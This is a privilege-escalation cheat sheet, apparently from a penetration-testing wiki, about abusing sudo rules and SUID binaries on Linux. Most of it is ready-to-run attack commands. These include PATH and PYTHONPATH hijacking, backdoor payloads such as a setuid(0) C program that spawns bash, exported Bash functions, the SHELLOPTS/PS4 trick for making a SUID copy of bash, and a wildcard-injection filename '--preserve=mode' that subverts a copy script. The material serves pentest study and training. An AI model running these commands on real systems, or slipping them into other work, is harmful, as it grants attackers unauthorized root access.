# PrivEsc via SUDO/SUID

## Verification

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:

### For SUDO

```bash
sudo -l #Check commands you can execute with sudo
```

### For SUID

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -400 2>/dev/null
find / \-perm -4000 -printf '%f\t%p\t%u\t%g\t%m\n' 2>/dev/null | column -t # More organized:
```

## NOPASSWD

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```bash
sudo -l
User www-data may run the following commands on docker1:
    (root) NOPASSWD: /usr/bin/find
```

## SETENV

This directive allows the user to **set an environment variable** while executing something:

```bash
sudo -l
User www-data may run the following commands on docker2:
    (root) SETENV: /app/start.sh
```

If this Bash script executes a Python script that imports a library, we can escalate privileges:

```bash
sudo PYTHONPATH=/tmp/ /app/start.sh
```

## Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**:&#x20;

* `testuser ALL= (root) less` you can exploit it by changing the PATH variable.

```bash
export PATH=/tmp:$PATH
```

Put your backdoor/payload in /tmp and name it "less":

```bash
echo "/bin/bash" > /tmp/service && chmod 777 /tmp/service
echo "bash -p" > /tmp/service && chmod 777 /tmp/service
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c && gcc /tmp/service.c -o /tmp/service
```

Execute.

```bash
chmod +x less
sudo less
```

This technique can also be used if a **suid** binary **executes another command without specifying the path to it (always check with** `strings` **the content of a weird SUID binary)**.

### SUID binary with command path

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

{% hint style="danger" %}
This is possible **only** in **Bash versions <4.2-048**. Verification: `/bin/bash --version`
{% endhint %}

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:

{% hint style="info" %}
SUID binary example: **/usr/local/bin/suid-env2**
{% endhint %}

```bash
# Method 1:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
# Method 2:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

Execute and done.

## GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

From the binaries we get, we will have to check in [GTFOBins](https://gtfobins.github.io) to see if some of our binaries are available to escalate privileges with the SUID permission. If there are custom binaries, we should investigate their functionality and see if there is a way to escalate privileges.

### Privilege Escalation

It depends on each binary, the GTFOBins resource provides it.

## Alternative sudo

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```bash
permit nopass www-data as root cmd find
```

## Tips

Sometimes, we can set the SUID bit to a binary as the root user, and then with our low privilege user, take advantage of that. However, if we copy a binary with SUID permissions from our user as root, the SUID permissions are erased. To avoid this, that is, to keep the SUID permissions, we can do this:

1. Maintain the SUID permissions of the **bash\_leviswings** binary. This way, the **bash\_root** will have SUID privileges and the owner will be root, allowing privilege escalation:

```bash
cp --preserve=mode bash_leviswings bash_root
```

&#x20; 2\. In case there is a script automating the copying task, i.e. using the `cp *` command, then we can trick it by creating a file with that option:

```bash
echo "" > "--preserve=mode"
```

